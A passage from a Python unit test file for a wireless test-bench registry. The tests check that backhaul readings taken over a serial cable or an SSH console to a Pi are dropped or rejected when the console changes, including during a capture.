                )
                over_the_cable = registry.describe()[0]["backhaul"]["console_id"]
                self.assertNotEqual(
                    over_the_cable, registry_mod.console_id(REMOTE),
                    "a reading taken over the cable is published as the Pi's",
                )
                self.assertEqual(
                    over_the_cable, registry_mod.console_token(context, "serial"),
                )

                # Connecting the node to its Pi is a different console, and the
                # cable's numbers must not survive into it as that Pi's. Driven
                # through the endpoint, not through the registry method it calls:
                # the reset only protects anybody if the connect path performs
                # it, and a test of the method alone stays green while the call
                # site is deleted.
                context.serial_worker = mock.Mock()
                connect_node("mesh1", request, _admin={})

                published = registry.describe()[0]["backhaul"]
                self.assertIsNone(published["role"])
                self.assertIsNone(published["uplink"])
                self.assertFalse(published["captured"])

    def test_opening_a_node_on_a_cable_drops_the_reading_from_its_pi(self) -> None:
        """The same rule from the other side, and the one this bench will hit.

        A node captured over its Pi, then brought to the desk and opened on a
        cable: the SSH console's numbers are not this console's. Keyed on where
        the reading came from rather than on whether the DUT has a remote
        configured, because the configuration is still there either way.
        """
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                context = registry.get("mesh1")
                context.backhaul_role = "node"
                context.backhaul_uplink = {"iface": "ath15", "rssi": -37}
                context.backhaul_captured = True
                context.backhaul_console = registry_mod.console_token(context, "ssh")

                registry.record_serial_params("mesh1", "/dev/cu.at-my-desk", 115200)

                published = registry.describe()[0]["backhaul"]
                self.assertIsNone(published["role"], "the Pi's reading served as the cable's")
                self.assertIsNone(published["uplink"])
                self.assertFalse(published["captured"])

    def test_a_console_that_changes_mid_capture_stores_nothing(self) -> None:
        """Two commands take seconds, and the console can move between them.

        The reading is filed under the console it started on, so if that stops
        being this DUT's console before it is stored, the registry would serve
        one device's numbers as another's — the identity handed straight back
        to the wrong card, rather than protecting it. Nothing partial is kept.
        """
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                context = registry.register_dut("bench", "Bench AP")
                registry.record_serial_params("bench", "/dev/cu.first", 115200)

                def capture(cmd: str, *args, **kwargs) -> str:
                    if cmd.startswith("iwconfig"):
                        # Somebody re-cables and reopens the DUT while this runs.
                        registry.record_serial_params("bench", "/dev/cu.second", 115200)
                        return IWCONFIG_AP6420
                    return "ADDR AID CHAN\n"

                context.serial_worker = mock.Mock()
                context.serial_worker.mode = "serial"
                context.serial_worker.capture_command.side_effect = capture
                request = mock.Mock()
                request.app.state.dut_registry = registry

                with self.assertRaises(HTTPException) as caught:
                    capture_rssi("bench", request)

                self.assertEqual(caught.exception.status_code, 409)
                published = registry.describe()[0]["backhaul"]
                self.assertFalse(published["captured"], "a reading kept from a console that moved")
                self.assertIsNone(published["uplink"])
                self.assertIsNone(published["role"])

    def test_a_console_opened_after_the_check_still_beats_the_write(self) -> None:
        """The check and the write are one operation or the check is decoration.

        Testing the console and then writing outside the registry's lock leaves
        a window: the open revokes the stored reading, and the capture puts it
        straight back under a console that has gone. Asserted against the
        registry method rather than through the endpoint, because that window
        is what the endpoint can no longer open.
        """
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                context = registry.register_dut("bench", "Bench AP")
                registry.record_serial_params("bench", "/dev/cu.first", 115200)
                stale = registry_mod.console_token(context, "serial")

                registry.record_serial_params("bench", "/dev/cu.second", 115200)

                self.assertFalse(
                    registry.store_backhaul_reading(
                        "bench", stale, "serial", {"iface": "ath15", "rssi": -37}, "node",
                    ),
                )
                self.assertFalse(
                    registry.store_backhaul_downlink("bench", stale, "serial", {"iface": "ath14"}),
                )
                published = registry.describe()[0]["backhaul"]
                self.assertFalse(published["captured"])
                self.assertIsNone(published["uplink"])
                self.assertIsNone(published["downlink"])

    def test_an_ssh_reading_survives_reconnecting_to_the_same_pi(self) -> None:
        """The reset must cost a capture only when the console really changed;
        a reconnect to the same Pi is the same console."""
        with tempfile.TemporaryDirectory() as directory:
            with _registries_under(Path(directory)) as make_registry:
                registry = make_registry()
                registry.register_dut("mesh1", "Mesh 1")
                registry.configure_remote("mesh1", REMOTE)
                context = registry.get("mesh1")
                context.backhaul_role = "node"
                context.backhaul_captured = True
                context.backhaul_console = registry_mod.console_token(context, "ssh")

                registry.note_console_open("mesh1", "ssh")

                self.assertEqual(registry.describe()[0]["backhaul"]["role"], "node")


if __name__ == "__main__":
    unittest.main()
